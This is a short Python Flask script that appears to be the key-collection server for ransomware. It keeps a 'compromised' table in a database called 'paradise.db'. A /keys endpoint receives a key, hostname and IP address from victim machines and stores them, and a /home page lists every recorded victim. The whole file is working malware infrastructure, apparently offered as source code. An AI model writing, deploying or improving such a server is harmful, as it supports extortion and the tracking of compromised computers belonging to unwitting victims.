import sqlite3
from flask import Flask, render_template, request

app = Flask(__name__)

#database connection
DATABASE = 'paradise.db'

connection = sqlite3.connect(DATABASE, check_same_thread=False)
cur = connection.cursor()

@app.route('/home')
def home():
	data = cur.execute('select * from compromised')
	return render_template('index.html',data=data)

#Post the keys and id
@app.route('/keys', methods=['POST'])
def post_compromised_data():
	keys = (request.form['key'])
	host = (request.form['hostname'])
	ip = (request.form['ip'])
	data = cur.execute("""insert into compromised (llave,hostname,ip) values (?,?,?)""", (keys,host,ip,))
	return "success?"



if __name__ == '__main__':
	app.run(debug = True)
